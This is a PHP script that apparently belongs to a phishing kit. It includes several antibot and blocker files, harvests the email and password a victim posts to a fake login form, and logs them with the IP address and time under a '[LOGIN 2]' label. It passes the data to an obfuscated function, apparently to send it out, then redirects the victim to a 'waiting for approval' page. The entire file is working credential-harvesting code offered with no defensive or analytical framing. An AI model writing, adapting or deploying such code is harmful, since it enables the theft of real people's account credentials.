<?php
include("./assets/function.php");
include("./assets/antibot.php");
include("./assets/antibots.php");
include("./assets/antibotsulit.php");
include("./assets/blocker.php");
include("./assets/bt.php");

$email = $_POST['eml'];
$password = $_POST['pwd'];
$time1 = date('M d Y - g:i a');
date_default_timezone_set('Asia/Manila');

            $hostname = gethostbyaddr($ip2);
            $message .= "[LOGIN 2]\n";
            $message .= "EMAIL: ".$email."\n";
            $message .= "PASSWORD: ".$password."\n";
            $message .= "IP ADDRESS: ".$ip2."\n";
            $message .= "DATE/TIME: ".$time1."\n";z6nQf($message);

            header("location:WaitingforApproval.html");
?>